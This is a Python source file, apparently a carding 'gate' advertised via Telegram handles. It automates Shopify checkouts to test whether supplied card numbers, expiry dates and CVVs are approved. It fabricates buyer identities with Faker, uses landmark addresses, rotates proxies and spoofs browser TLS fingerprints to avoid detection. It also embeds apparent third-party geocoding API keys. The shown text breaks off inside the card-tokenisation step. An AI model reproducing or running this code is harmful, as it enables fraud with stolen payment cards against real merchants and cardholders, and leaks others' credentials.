# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
"""
Shopify Checkout gate — Python port of php/shopify_gate.php
(ShopifyAPi + CheckoutDataExtractor + FakeGenerator + ProxyManager + CurlX).

Flow: pick cheapest affordable product → add to cart → proposal GraphQL →
CC token (deposit.shopifycs.com) → SubmitForCompletion → poll receipt → classify.

Result: one of the API statuses  Approved ✅ / Declined ❌ / Error ⚠️
"""
import json
import os
import random
import re
import time
from pathlib import Path
from urllib.parse import quote

from faker import Faker

try:
    import curl_cffi.requests as creq
except Exception:  # pragma: no cover
    creq = None

try:
    import requests as creq_requests
except Exception:  # pragma: no cover
    creq_requests = None

from Commands.Gates._template import DIV

_GATEWAY   = 'Shopify Checkout'
_ROOT      = Path(__file__).resolve().parent.parent.parent
_PHP_DIR   = _ROOT / 'php'
_GEO_CACHE = Path(_PHP_DIR / 'cache_geo.json')
_PROXY_F   = Path(_PHP_DIR / 'proxies.txt')
_DEBUG     = os.getenv('SHOPIFY_DEBUG', 'true').lower() not in ('0', 'false', 'no', 'off')

_f = Faker('en_US')

# ── UA pool (fake_helper::userAgent() - windows) ─────────────────────────
_UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
]

# ── Address pools (ported from php/src/FakeGenerator.php) ────────────────
_ADDRESSES_US = [
    ("1600", "Pennsylvania Ave NW", "Washington", "DC", "20500"),
    ("350", "5th Ave", "New York", "NY", "10118"),
    ("1", "Infinite Loop", "Cupertino", "CA", "95014"),
    ("221B", "Baker Street", "Los Angeles", "CA", "90001"),
    ("600", "Montgomery St", "San Francisco", "CA", "94111"),
    ("401", "N Michigan Ave", "Chicago", "IL", "60611"),
    ("500", "S Capitol Ave", "Indianapolis", "IN", "46204"),
    ("600", "Biscayne Blvd", "Miami", "FL", "33132"),
    ("700", "Louisiana St", "Houston", "TX", "77002"),
    ("1100", "Congress Ave", "Austin", "TX", "78701"),
    ("1601", "Bryant St", "Denver", "CO", "80204"),
    ("1500", "Market St", "Philadelphia", "PA", "19102"),
    ("100", "Peachtree St NE", "Atlanta", "GA", "30303"),
    ("500", "Woodward Ave", "Detroit", "MI", "48226"),
    ("200", "Boylston St", "Boston", "MA", "02116"),
    ("345", "Park Ave S", "New York", "NY", "10010"),
    ("800", "N Glebe Rd", "Arlington", "VA", "22203"),
    ("3500", "S Las Vegas Blvd", "Las Vegas", "NV", "89109"),
    ("600", "Congress St", "Portland", "ME", "04101"),
    ("200", "N Broadway", "Los Angeles", "CA", "90012"),
    ("123", "Main St", "Dallas", "TX", "75201"),
    ("987", "Elm St", "Charlotte", "NC", "28202"),
    ("765", "Central Ave", "Phoenix", "AZ", "85004"),
    ("321", "Broad St", "Nashville", "TN", "37203"),
    ("444", "Oak St", "Columbus", "OH", "43215"),
    ("555", "Pine St", "Seattle", "WA", "98101"),
    ("777", "Maple Ave", "Minneapolis", "MN", "55402"),
    ("888", "River St", "St. Louis", "MO", "63101"),
    ("999", "Cedar Rd", "Kansas City", "MO", "64106"),
    ("111", "Hickory St", "New Orleans", "LA", "70130"),
    ("222", "Sycamore Ln", "Milwaukee", "WI", "53202"),
    ("333", "Sunset Blvd", "Los Angeles", "CA", "90046"),
    ("121", "Ocean Dr", "Miami Beach", "FL", "33139"),
    ("456", "Jefferson Ave", "Louisville", "KY", "40202"),
    ("789", "Capitol St", "Sacramento", "CA", "95814"),
    ("654", "Union St", "Portland", "OR", "97204"),
    ("321", "Franklin St", "Jacksonville", "FL", "32202"),
    ("852", "Lexington Ave", "Baltimore", "MD", "21201"),
    ("963", "King St", "Charleston", "SC", "29401"),
]

_ADDRESSES_CA = [
    ("100", "King St W", "Toronto", "ON", "M5V 1E2"),
    ("200", "Yonge St", "Toronto", "ON", "M4W 3G2"),
    ("333", "Bay St", "Toronto", "ON", "M5J 2R2"),
    ("700", "De la Gauchetière St W", "Montréal", "QC", "H3B 2Y3"),
    ("1200", "Sainte-Catherine St W", "Montréal", "QC", "H3G 1P6"),
    ("500", "Granville St", "Vancouver", "BC", "V6Z 1Y3"),
    ("1050", "W Georgia St", "Vancouver", "BC", "V6E 3P3"),
    ("260", "Rideau St", "Ottawa", "ON", "K1N 5Y4"),
    ("400", "Kent St W", "Ottawa", "ON", "K2P 2R6"),
    ("119", "17 Ave SW", "Calgary", "AB", "T2T 0E3"),
    ("800", "Stephen Ave NW", "Calgary", "AB", "T2P 1C4"),
    ("101", "104 Ave NW", "Edmonton", "AB", "T5J 4R1"),
    ("300", "2nd Ave W", "Edmonton", "AB", "T5J 0R2"),
    ("456", "Portage Ave", "Winnipeg", "MB", "R3C 3E2"),
    ("165", "Market St", "Halifax", "NS", "B3J 3K4"),
    ("240", "Waterloo St", "London", "ON", "N6B 1R3"),
    ("150", "Johnson St", "Victoria", "BC", "V8W 2K4"),
    ("360", "Albert St", "Saskatoon", "SK", "S7K 1A6"),
    ("210", "Victoria St", "Kitchener", "ON", "N2G 2L3"),
    ("95", "Broadview Ave", "Toronto", "ON", "M4K 2P6"),
]

_ADDRESSES_UK = [
    ("1", "Baker Street", "London", "", "NW1 6XE"),
    ("10", "Downing Street", "London", "", "SW1A 2AA"),
    ("221B", "Baker Street", "London", "", "NW1 6XE"),
    ("160", "Tottenham Ct Rd", "London", "", "W1T 1JA"),
    ("55", "Victoria St", "London", "", "SW1H 0TL"),
    ("1", "Parliament Square", "London", "", "SW1A 0AA"),
    ("75", "Oxford St", "London", "", "W1D 2DB"),
    ("110", "Strand", "London", "", "WC2R 0RL"),
    ("40", "Fleet St", "London", "", "EC4Y 1BJ"),
    ("30", "Fenchurch St", "London", "", "EC3M 3JF"),
    ("100", "Deansgate", "Manchester", "", "M3 2LR"),
    ("5", "Colmore Circus", "Birmingham", "", "B1 2EE"),
    ("12", "Princes St", "Edinburgh", "", "EH2 2DH"),
    ("60", "Queen Charlotte St", "Bristol", "", "BS1 4HJ"),
    ("25", "Park Row", "Leeds", "", "LS1 5PW"),
]

_ADDRESSES_AU = [
    ("1", "Macquarie St", "Sydney", "NSW", "2000"),
    ("500", "George St", "Sydney", "NSW", "2000"),
    ("101", "Collins St", "Melbourne", "VIC", "3000"),
    ("360", "Collins St", "Melbourne", "VIC", "3000"),
    ("200", "Queen St", "Brisbane", "QLD", "4000"),
    ("80", "King William St", "Adelaide", "SA", "5000"),
    ("140", "St Georges Tce", "Perth", "WA", "6000"),
    ("30", "Murray St", "Hobart", "TAS", "7000"),
    ("48", "Northbourne Ave", "Canberra", "ACT", "2601"),
    ("120", "Hay St", "Perth", "WA", "6000"),
]

_PRODUCT_BLACKLIST = [
    'return', 'protection', 'exchange', 'warranty', 'extended warranty',
    'insurance', 'plan', 'membership', 'subscription', 'gift card',
    'store credit', 'credit', 'add-on', 'addon', 'fee', 'service',
    'unlimited return', 'free unlimited',
]

_GEO_KEYS = ['pk.096811ec6ed0fe60bb3f41c409bb332d', 'pk.2790b6fb623e84e3f8252389ff06079c']


def _log(step: str, card: str = '') -> None:
    if not _DEBUG:
        return
    try:
        ts = time.strftime('%H:%M:%S.') + f"{(time.time() % 1):.3f}"[2:]
        mask = f"{card[:4]}****{card[-3:]}" if card else '-'
        with open(_PHP_DIR / 'gate_log.txt', 'a', encoding='utf-8') as fh:
            fh.write(f"[{ts}] [{mask}] {step}\n")
    except Exception:
        pass


def _get_string(haystack: str, start: str, end: str) -> str:
    try:
        s = haystack.index(start) + len(start)
        return haystack[s:haystack.index(end, s)]
    except ValueError:
        return ''


# ── HTTP client (replaces CurlX) ────────────────────────────────────────
class Curl:
    def __init__(self, proxy: dict = None):
        self.proxy = proxy
        if creq is not None:
            try:
                self.sess = creq.Session(impersonate=random.choice(['chrome124', 'chrome120', 'safari17_0']))
            except Exception:
                self.sess = creq.Session()
        else:
            self.sess = None
        self._proxy_cfg()

    def _proxy_cfg(self):
        if not self.sess or not self.proxy:
            return
        server = self.proxy.get('server', '') or ''
        auth = self.proxy.get('auth', '') or ''
        url = f'http://{server}'
        if auth:
            url = f'http://{auth}@{server}'
        self.sess.proxies = {'http': url, 'https': url}

    @staticmethod
    def _hdrs(headers: list) -> dict:
        out = {}
        for h in headers or []:
            if ':' in h:
                k, v = h.split(':', 1)
                out[k.strip()] = v.strip()
        return out

    def get(self, url: str, headers: list = None) -> str:
        if not self.sess:
            raise RuntimeError('curl_cffi not available')
        r = self.sess.get(url, headers=self._hdrs(headers), timeout=60)
        return r.text

    def post(self, url: str, data, headers: list = None) -> str:
        if not self.sess:
            raise RuntimeError('curl_cffi not available')
        h = self._hdrs(headers)
        if isinstance(data, (dict, list)):
            r = self.sess.post(url, json=data, headers=h, timeout=60)
        else:
            r = self.sess.post(url, data=data, headers=h, timeout=60)
        return r.text


def post_plain(url: str, data, headers: list = None, proxy: dict = None, timeout: int = 30) -> str:
    """OpenSSL (requests) fallback — needed because deposit.shopifycs.com 500s on curl_cffi TLS."""
    if creq_requests is None:
        return ''
    proxies = None
    if proxy:
        server = proxy.get('server', '') or ''
        auth = proxy.get('auth', '') or ''
        p = f'http://{server}'
        if auth:
            p = f'http://{auth}@{server}'
        proxies = {'http': p, 'https': p}
    hdrs = Curl._hdrs(headers) if headers else {}
    try:
        if isinstance(data, (dict, list)):
            r = creq_requests.post(url, json=data, headers=hdrs, proxies=proxies, timeout=timeout)
        else:
            r = creq_requests.post(url, data=data, headers=hdrs, proxies=proxies, timeout=timeout)
        return r.text
    except Exception:
        return ''


# ── Proxy manager (replaces php/src/ProxyManager.php) ───────────────────
def _parse_proxy_line(line: str) -> dict:
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    m = re.match(r'^(.+):(.+)@(.+):(\d+)$', line)          # user:pass@host:port
    if m:
        return {'method': 'custom', 'server': f'{m.group(3)}:{m.group(4)}', 'auth': f'{m.group(1)}:{m.group(2)}'}
    m = re.match(r'^(.+):(\d+)\|(.+):(.+)$', line)          # host:port|user:pass
    if m:
        return {'method': 'custom', 'server': f'{m.group(1)}:{m.group(2)}', 'auth': f'{m.group(3)}:{m.group(4)}'}
    m = re.match(r'^(.+):(\d+)\|(.+)$', line)               # host:port|auth
    if m:
        return {'method': 'custom', 'server': f'{m.group(1)}:{m.group(2)}', 'auth': m.group(3)}
    m = re.match(r'^(.+):(\d+)$', line)                     # host:port
    if m:
        return {'method': 'tunnel', 'server': f'{m.group(1)}:{m.group(2)}'}
    return None


def load_proxies(path: str = None) -> list:
    p = Path(path) if path else _PROXY_F
    proxies = []
    if not p.exists():
        return proxies
    for line in p.read_text(encoding='utf-8', errors='ignore').splitlines():
        proxy = _parse_proxy_line(line)
        if proxy:
            proxies.append(proxy)
    return proxies


# ── Fake helpers (replaces FakeGenerator) ───────────────────────────────
def _fn() -> str:
    return _f.first_name().replace(' ', '').replace('.', '')


def _ln() -> str:
    return _f.last_name().replace(' ', '').replace('.', '')


def _email(fn: str, ln: str) -> str:
    return f"{fn}{ln}{random.randint(1, 100)}@{random.choice(['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'])}"


def _phone(country: str) -> str:
    if country == 'CA':
        ac = random.choice([416, 647, 905, 289, 613, 514, 438, 519, 226, 902, 604, 778, 236, 587, 403, 780, 306, 204])
        return f"+1{ac}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    if country == 'UK':
        ac = random.choice(['20', '121', '131', '141', '151', '161', '113', '117', '121', '1273'])
        return f"+44{ac}{random.randint(100000, 999999)}"
    if country == 'AU':
        ac = random.choice([2, 3, 7, 8])
        return f"+61{ac}{random.randint(1000, 9999)}{random.randint(1000, 9999)}"
    ac = random.choice([202, 212, 213, 312, 305, 415, 602, 404, 503, 617, 702, 214, 303, 313, 512, 615])
    return f"+1{ac}{random.randint(200, 999)}{random.randint(1000, 9999)}"


def _random_address(country: str) -> dict:
    pool = {'CA': _ADDRESSES_CA, 'UK': _ADDRESSES_UK, 'AU': _ADDRESSES_AU}.get(country, _ADDRESSES_US)
    num, street, city, state, zipcode = random.choice(pool)
    return {'num': num, 'address1': street, 'address': f'{num} {street}',
            'city': city, 'state': state, 'zip': zipcode, 'country': country}


def _ua() -> str:
    return random.choice(_UAS)


# ── Geocode (LocationIQ, cached) ────────────────────────────────────────
def _geocode(client: Curl, num: str, street: str, city: str) -> dict:
    cache = {}
    if _GEO_CACHE.exists():
        try:
            cache = json.loads(_GEO_CACHE.read_text(encoding='utf-8'))
        except Exception:
            cache = {}
    key = f"{num}, {street}, {city}"
    geo_key = re.sub(r'\W+', '', key.lower())
    if geo_key in cache:
        return cache[geo_key]

    url = (f"https://us1.locationiq.com/v1/search?key={random.choice(_GEO_KEYS)}"
           f"&q={quote(key)}&format=json")
    try:
        data = json.loads(client.get(url))
    except Exception as e:
        raise RuntimeError(f'LocationIQ request failed: {e}') from e
    lat = float(data[0].get('lat')) if data and data[0].get('lat') else 40.747855
    lon = float(data[0].get('lon')) if data and data[0].get('lon') else -73.94499
    if data and not data[0].get('lat'):
        raise RuntimeError('LocationIQ API returned invalid coordinates.')
    geo = {'lat': lat, 'lon': lon}
    cache[geo_key] = geo
    try:
        _GEO_CACHE.write_text(json.dumps(cache), encoding='utf-8')
    except Exception:
        pass
    return geo


# ── Checkout data extractor (replaces CheckoutDataExtractor) ────────────
class CheckoutData:
    def __init__(self, checkout_html: str):
        m = re.search(r'<meta name="serialized-graphql" content="([^"]*)"', checkout_html)
        if not m:
            raise RuntimeError('serialized-graphql not found in checkout HTML')
        raw = m.group(1).replace('&quot;', '"').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>')
        try:
            data = json.loads(raw)
        except Exception as e:
            raise RuntimeError(f'Invalid serialized-graphql JSON: {e}') from e

        self.negotiate_result = None
        self.session_data = None
        self.shop_data = None
        for key, val in (data or {}).items():
            if not isinstance(val, dict):
                continue
            if val.get('session', {}).get('negotiate', {}).get('result'):
                self.negotiate_result = val['session']['negotiate']['result']
                self.session_data = val['session']
            if 'shop' in val:
                self.shop_data = val['shop']
        if not self.negotiate_result:
            raise RuntimeError('session.negotiate.result not found in serialized-graphql')
        self._currency = None

    # -- token/values ----------------------------------------------------
    @staticmethod
    def meta(html: str, name: str) -> str:
        m = re.search(rf'<meta name="{re.escape(name)}" content="([^"]*)"', html)
        if m:
            val = m.group(1).replace('&quot;', '"').replace('&amp;', '&')
            try:
                return json.loads(f'"{val}"')
            except Exception:
                return val.strip('"')
        return ''

    def get_queue_token(self) -> str:
        return self.negotiate_result.get('queueToken', '')

    def get_currency(self) -> str:
        if self._currency:
            return self._currency
        for line in self.negotiate_result.get('sellerProposal', {}).get('merchandise', {}).get('merchandiseLines', []):
            if line.get('merchandise', {}).get('price', {}).get('currencyCode'):
                return line['merchandise']['price']['currencyCode']
            if line.get('totalAmount', {}).get('value', {}).get('currencyCode'):
                return line['totalAmount']['value']['currencyCode']
        return 'USD'

    def set_currency(self, currency: str):
        self._currency = currency

    def is_shipping_required(self) -> bool:
        return bool(self.negotiate_result.get('buyerProposal', {}).get('isShippingRequired', True))

    def get_stable_ids(self) -> list:
        return [l.get('stableId') for l in self.negotiate_result.get('buyerProposal', {})
                .get('merchandise', {}).get('merchandiseLines', []) if l.get('stableId')]

    def get_payment_method_identifier(self) -> str:
        for pl in self.negotiate_result.get('sellerProposal', {}).get('payment', {}).get('availablePaymentLines', []):
            pm = pl.get('paymentMethod', {})
            if pm.get('__typename') == 'PaymentProvider' and pm.get('paymentMethodIdentifier'):
                return pm['paymentMethodIdentifier']
        for pl in self.negotiate_result.get('sellerProposal', {}).get('payment', {}).get('availablePaymentLines', []):
            pm = pl.get('paymentMethod', {})
            if pm.get('paymentMethodIdentifier'):
                return pm['paymentMethodIdentifier']
        return ''

    def get_delivery_handle(self) -> str:
        lines = self.negotiate_result.get('sellerProposal', {}).get('delivery', {}).get('deliveryLines', [])
        if not lines:
            return ''
        sdl = lines[0]
        strategies = sdl.get('availableDeliveryStrategies', [])
        if strategies and strategies[0].get('handle'):
            return strategies[0]['handle']
        return sdl.get('selectedDeliveryStrategy', {}).get('handle', '')

    def get_delivery_amount(self) -> str:
        lines = self.negotiate_result.get('sellerProposal', {}).get('delivery', {}).get('deliveryLines', [])
        if not lines:
            return '0.00'
        strategies = lines[0].get('availableDeliveryStrategies', [])
        if strategies and strategies[0].get('amount', {}).get('value', {}).get('amount'):
            return strategies[0]['amount']['value']['amount']
        return '0.00'

    def get_tax_amount(self) -> str:
        return self.negotiate_result.get('sellerProposal', {}).get('tax', {}).get('totalTaxAmount', {}).get('value', {}).get('amount') or '0'

    def get_tax_currency(self) -> str:
        cur = self.negotiate_result.get('sellerProposal', {}).get('tax', {}).get('totalTaxAmount', {}).get('value', {}).get('currencyCode')
        return cur or self.get_currency()

    def get_total_amount(self) -> str:
        return self.negotiate_result.get('sellerProposal', {}).get('runningTotal', {}).get('value', {}).get('amount') or '0'

    def update_from_proposal_response(self, seller_proposal: dict):
        self.negotiate_result['sellerProposal'] = seller_proposal
        sp_lines = seller_proposal.get('merchandise', {}).get('merchandiseLines', [])
        bp_lines = self.negotiate_result.get('buyerProposal', {}).get('merchandise', {}).get('merchandiseLines', [])
        if isinstance(bp_lines, list) and sp_lines:
            for bp_line in bp_lines:
                for sp_line in sp_lines:
                    if sp_line.get('stableId') == bp_line.get('stableId'):
                        if sp_line.get('totalAmount', {}).get('value'):
                            bp_line.setdefault('totalAmount', {}).setdefault('value', {})['amount'] = sp_line['totalAmount']['value']['amount']
                            bp_line.setdefault('totalAmount', {}).setdefault('value', {})['currencyCode'] = sp_line['totalAmount']['value']['currencyCode']
                        break

    # -- payload builders -------------------------------------------------
    @staticmethod
    def build_address(addr: dict) -> dict:
        return {'streetAddress': {
            'address1': addr['address'], 'city': addr['city'], 'countryCode': addr['countryCode'],
            'postalCode': addr['zip'], 'firstName': addr['firstName'], 'lastName': addr['lastName'],
            'zoneCode': addr['state'], 'phone': addr['phone'],
        }}

    @staticmethod
    def build_destination(addr: dict) -> dict:
        return {'streetAddress': {
            'address1': addr['address'], 'city': addr['city'], 'countryCode': addr['countryCode'],
            'postalCode': addr['zip'], 'firstName': addr['firstName'], 'lastName': addr['lastName'],
            'zoneCode': addr['state'], 'phone': addr['phone'], 'oneTimeUse': False,
            'coordinates': {'latitude': addr['lat'], 'longitude': addr['lon']},
        }}

    @staticmethod
    def build_buyer_identity(currency: str, country_code: str, email: str) -> dict:
        return {
            'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
            'email': email, 'emailChanged': True, 'phoneCountryCode': country_code,
            'marketingConsent': [], 'shopPayOptInPhone': {'countryCode': country_code}, 'rememberMe': False,
        }

    @staticmethod
    def static_fields() -> dict:
        return {
            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
            'deliveryExpectations': {'deliveryExpectationLines': []},
            'memberships': {'memberships': []},
            'tip': {'tipLines': []},
            'note': {'message': None, 'customAttributes': []},
            'localizationExtension': {'fields': []},
            'nonNegotiableTerms': None,
            'scriptFingerprint': {'signature': None, 'signatureUuid': None,
                                  'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []},
            'optionalDuties': {'buyerRefusesDuties': False},
            'cartMetafields': [],
        }

    def build_proposal_delivery(self, address_data: dict = None) -> dict:
        delivery_lines = []
        bp_lines = self.negotiate_result.get('buyerProposal', {}).get('delivery', {}).get('deliveryLines', [])
        if bp_lines:
            is_shipping = self.is_shipping_required()
            for d_line in bp_lines:
                target_lines = [{'stableId': l.get('stableId')} for l in d_line.get('targetMerchandise', {}).get('linesV2', [])]
                line = {
                    'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions':
                                                 {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}},
                                                 'options': {}},
                    'targetMerchandiseLines': {'lines': target_lines},
                    'deliveryMethodTypes': ['SHIPPING'] if is_shipping else d_line.get('deliveryMethodTypes', []),
                    'expectedTotalPrice': {'any': True}, 'destinationChanged': True,
                }
                if is_shipping and address_data:
                    line['destination'] = self.build_destination(address_data)
                delivery_lines.append(line)
        else:
            stable_ids = self.get_stable_ids()
            if stable_ids:
                is_shipping = self.is_shipping_required()
                line = {
                    'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions':
                                                 {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}},
                                                 'options': {}},
                    'targetMerchandiseLines': {'lines': [{'stableId': s} for s in stable_ids]},
                    'deliveryMethodTypes': ['SHIPPING' if is_shipping else 'NONE'],
                    'expectedTotalPrice': {'any': True}, 'destinationChanged': True,
                }
                if is_shipping and address_data:
                    line['destination'] = self.build_destination(address_data)
                delivery_lines.append(line)
        return {'deliveryLines': delivery_lines, 'noDeliveryRequired': [],
                'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}

    def build_submit_delivery(self, is_shipping: bool, handle: str, delamount: str, currency: str,
                              stable_id: str, address_data: dict = None) -> dict:
        line = {
            'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': handle, 'customDeliveryRate': False},
                                         'options': {}},
            'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
            'deliveryMethodTypes': ['SHIPPING' if is_shipping else 'NONE'],
            'expectedTotalPrice': {'value': {'amount': delamount, 'currencyCode': currency}},
            'destinationChanged': not is_shipping,
        }
        if is_shipping and address_data:
            line['destination'] = self.build_destination(address_data)
        return {'deliveryLines': [line], 'noDeliveryRequired': [], 'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}

    def build_proposal_merchandise(self) -> dict:
        lines = []
        for line in self.negotiate_result.get('buyerProposal', {}).get('merchandise', {}).get('merchandiseLines', []):
            merch = line.get('merchandise', {})
            plan = merch.get('sellingPlan', {}) or {}
            lines.append({
                'stableId': line.get('stableId'),
                'merchandise': {'productVariantReference': {
                    'id': merch.get('id', ''), 'variantId': merch.get('variantId', ''),
                    'properties': merch.get('properties', []),
                    'sellingPlanId': plan.get('id'), 'sellingPlanDigest': plan.get('sellingPlanGroupId')}},
                'quantity': {'items': {'value': line.get('quantity', {}).get('items', {}).get('value', 1)}},
                'expectedTotalPrice': {'value': {'amount': line.get('totalAmount', {}).get('value', {}).get('amount', '0'),
                                                  'currencyCode': self.get_currency()}},
                'lineComponentsSource': None, 'lineComponents': [],
            })
        return {'merchandiseLines': lines}

    def build_proposal_payload(self, session_token: str, queue_token: str, address_data: dict,
                               email: str, proposal_query_id: str) -> dict:
        currency = self.get_currency()
        cc = address_data['countryCode']
        static = self.static_fields()
        payload = {
            'sessionInput': {'sessionToken': session_token},
            'queueToken': queue_token,
            'delivery': self.build_proposal_delivery(address_data),
            'merchandise': self.build_proposal_merchandise(),
            'payment': {'totalAmount': {'any': True}, 'paymentLines': [],
                        'billingAddress': self.build_address(address_data)},
            'buyerIdentity': self.build_buyer_identity(currency, cc, email),
            'taxes': {'proposedAllocations': None,
                      'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                      'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None,
                      'proposedExemptions': []},
            'shopPayArtifact': {'optIn': {'vaultEmail': '', 'vaultPhone': '', 'optInSource': 'REMEMBER_ME'}},
        }
        payload.update(static)
        return {'variables': payload, 'operationName': 'Proposal', 'id': proposal_query_id}

    def build_submit_payload(self, session_token: str, queue_token: str, handle: str, delamount: str,
                             tax: str, totalamt: str, currency: str, cctoken: str, payment_method_identifier: str,
                             checkout_token: str, stable_id: str, submit_query_id: str, site: str,
                             cc_first6: str, address_data: dict, email: str) -> dict:
        cc = address_data['countryCode']
        static = self.static_fields()
        is_shipping = self.is_shipping_required()
        payment_line = {
            'paymentMethod': {
                'directPaymentMethod': {'paymentMethodIdentifier': payment_method_identifier, 'sessionId': cctoken,
                                        'billingAddress': self.build_address(address_data), 'cardSource': None},
                'giftCardPaymentMethod': None, 'redeemablePaymentMethod': None, 'walletPaymentMethod': None,
                'walletsPlatformPaymentMethod': None, 'localPaymentMethod': None, 'paymentOnDeliveryMethod': None,
                'paymentOnDeliveryMethod2': None, 'manualPaymentMethod': None, 'customPaymentMethod': None,
                'offsitePaymentMethod': None, 'customOnsitePaymentMethod': None, 'deferredPaymentMethod': None,
                'customerCreditCardPaymentMethod': None, 'paypalBillingAgreementPaymentMethod': None,
                'remotePaymentInstrument': None,
            },
            'amount': {'value': {'amount': totalamt, 'currencyCode': currency}},
        }
        input_data = {
            'sessionInput': {'sessionToken': session_token},
            'queueToken': queue_token,
            'delivery': self.build_submit_delivery(is_shipping, handle, delamount, currency, stable_id, address_data),
            'merchandise': self.build_proposal_merchandise(),
            'payment': {'totalAmount': {'any': True}, 'paymentLines': [payment_line],
                        'billingAddress': self.build_address(address_data), 'creditCardBin': cc_first6},
            'buyerIdentity': self.build_buyer_identity(currency, cc, email),
            'taxes': {'proposedAllocations': None,
                      'proposedTotalAmount': {'value': {'amount': tax, 'currencyCode': currency}},
                      'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None,
                      'proposedExemptions': []},
            'shopPayArtifact': {'optIn': {'vaultEmail': '', 'vaultPhone': address_data['phone'], 'optInSource': 'REMEMBER_ME'}},
        }
        input_data.update(static)
        return {'variables': {'input': input_data, 'attemptToken': f'{checkout_token}-64ptawtxh65',
                              'metafields': [],
                              'analytics': {'requestUrl': f'{site}/checkouts/cn/{checkout_token}', 'pageId': stable_id}},
                'operationName': 'SubmitForCompletion', 'id': submit_query_id}


# ── Main checkout (replaces ShopifyAPi::checkout) ───────────────────────
class ShopifyCheckout:
    def __init__(self, site: str, proxy: dict = None, cc: str = '', mes: str = '', ano: str = '', cvv: str = '',
                 address: dict = None, email: str = None, product: dict = None):
        self.site = site
        self.proxy = proxy
        self.cc, self.mes, self.ano, self.cvv = cc, mes, ano, cvv
        self.external_address = address
        self.external_email = email
        self.external_product = product
        self.currency = 'USD'
        self.force_currency = ''
        self.bad_products = []
        self.current_variant_id = ''
        self.global_tries = 0
        self.global_max_tries = 3

    # -- step: product ----------------------------------------------------
    @staticmethod
    def get_minimum_price_product_details(data: dict, excluded: list) -> dict:
        products = data.get('products') if isinstance(data, dict) else None
        if products is None:
            raise RuntimeError('Invalid JSON format or missing products key')
        min_price, result = None, {'id': None, 'price': None, 'title': None}
        for product in products:
            title = str(product.get('title', '')).lower()
            if any(kw in title for kw in _PRODUCT_BLACKLIST):
                continue
            for variant in product.get('variants', []):
                if variant.get('id') in excluded:
                    continue
                try:
                    price = float(variant.get('price'))
                except (TypeError, ValueError):
                    continue
                if price >= 1.00 and (min_price is None or price < min_price):
                    min_price = price
                    result = {'id': variant.get('id'), 'price': variant.get('price'), 'title': product.get('title')}
        if min_price is None:
            raise RuntimeError('No products found with price greater than or equal to 1.00')
        return result

    @staticmethod
    def extract_operation_ids(html: str, client: Curl) -> dict:
        result = {'proposal': '', 'submitForCompletion': '', 'pollForReceipt': ''}
        importmap_json = _get_string(html, '<script type="systemjs-importmap">', '</script>')
        actions_path = hydrate_path = ''
        imports = {}
        try:
            if importmap_json:
                imports = json.loads(importmap_json).get('imports', {})
        except Exception:
            imports = {}

        for path in imports:
            if re.search(r'/actions\.', path):
                actions_path = path
                break
        if not actions_path:
            for path in imports:
                if re.search(r'/actions-legacy\.', path):
                    actions_path = path
                    break
        if not actions_path:
            m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions(?:-legacy)?\.[^."]+\.js)', html)
            if m:
                actions_path = m.group(1)
        if actions_path:
            try:
                js = client.get('https://cdn.shopify.com' + actions_path)
                m = re.search(r'id:\s*"([a-f0-9]{64})",\s*type:\s*"query",\s*name:\s*"Proposal"', js, re.I)
                if m:
                    result['proposal'] = m.group(1)
                m = re.search(r'id:\s*"([a-f0-9]{64})",\s*type:\s*"mutation",\s*name:\s*"SubmitForCompletion"', js, re.I)
                if m:
                    result['submitForCompletion'] = m.group(1)
            except Exception:
                pass

        for path in imports:
            if re.search(r'/hydrate\.', path):
                hydrate_path = path
                break
        if not hydrate_path:
            for path in imports:
                if re.search(r'/hydrate-legacy\.', path):
                    hydrate_path = path
                    break
        if not hydrate_path:
            m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/hydrate(?:-legacy)?\.[^."]+\.js)', html)
            if m:
                hydrate_path = m.group(1)
        if hydrate_path:
            try:
                js = client.get('https://cdn.shopify.com' + hydrate_path)
                m = re.search(r'id:\s*"([a-f0-9]{64})",\s*type:\s*"query",\s*name:\s*"PollForReceipt"', js, re.I)
                if m:
                    result['pollForReceipt'] = m.group(1)
            except Exception:
                pass
        return result

    # -- step: cc token ---------------------------------------------------
    def get_cc_token(self, client: Curl, first_name: str, last_name: str, domain: str) -> str:
        body = json.dumps({'credit_card': {
            'number': self.cc, 'month': self.mes, 'year': self.ano,
            'verification_value': self.cvv, 'start_month': None, 'start_year': None,
            'issue_number': '', 'name': f'{first_name} {last_name}'},
            'payment_session_scope': domain})
        tokens = (
            client.post('https://deposit.shopifycs.com/sessions', body,
                        headers=['Content-Type: application/json']),
